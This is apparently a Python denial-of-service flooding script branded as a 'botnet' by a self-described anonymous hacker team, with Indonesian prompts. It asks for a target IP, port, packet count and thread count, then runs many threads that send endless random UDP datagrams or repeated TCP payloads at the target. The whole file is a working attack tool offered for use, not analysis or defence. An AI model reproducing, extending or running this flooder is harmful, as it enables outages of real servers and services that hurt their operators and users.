#!/usr/bin/env python3
#Cyber ArthurXzz
#Author : Arthur Anonymous
import random
import socket
import threading
import os

os.system("clear")
print("ArthurXzz Anonymous Team")
print("Website : Discord.gg//Anonymous")
print("JET SCROFT BOTNET")
ip = str(input(" Ip Virus Target: "))
port = int(input(" Port Virus Target: "))
choice = str(input(" Siap Mengirim Virus?(y/n): "))
times = int(input(" Packet Virus: "))
threads = int(input(" Threads Virus: "))
def run():
  data = random._urandom(1020)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" | ArthurXzz Memasukan Virus Ke Target!!!|")
    except:
      print("[!] | ArthurXzz Memasukan Virus Ke Target!!! |")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" ArthurXzz Cyber Team!!!")
    except:
      s.close()
      print("[*] Virus Kebanyakan Server Mati")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
